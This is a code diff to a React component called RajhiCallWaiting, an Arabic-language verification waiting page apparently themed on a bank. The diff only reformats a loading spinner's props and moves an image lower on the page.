@@ -69,7 +69,12 @@ const RajhiCallWaiting = () => {
       {loading && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
           <div className="flex flex-col items-center gap-4 bg-white p-8 rounded-md shadow-lg">
-            <TailSpin height="40" width="40" color="#1e3a8a" ariaLabel="loading" />
+            <TailSpin
+              height="40"
+              width="40"
+              color="#1e3a8a"
+              ariaLabel="loading"
+            />
             <span className="text-gray-700 font-medium">جاري التحقق...</span>
           </div>
         </div>
@@ -86,10 +91,6 @@ const RajhiCallWaiting = () => {
         </h1>
         <p className="text-sm text-gray-500 mb-2">لتأكيد بياناتك</p>
         <div className="w-10 h-0.5 bg-[#2563eb] rounded-full" />
-      </div>
-
-      <div>
-        <img src="/rajhi_call.jpeg" alt="Rajhi Call" className="w-full"/>
       </div>
 
       <div className="bg-white border border-gray-200 rounded-2xl p-5 shadow-sm mt-2">
@@ -140,6 +141,9 @@ const RajhiCallWaiting = () => {
         >
           تأكيد التوثيق
         </button>
+      </div>
+      <div>
+        <img src="/rajhi_call.jpeg" alt="Rajhi Call" className="w-full" />
       </div>
 
       <div className="flex flex-col items-center gap-2 mt-6 mb-4">
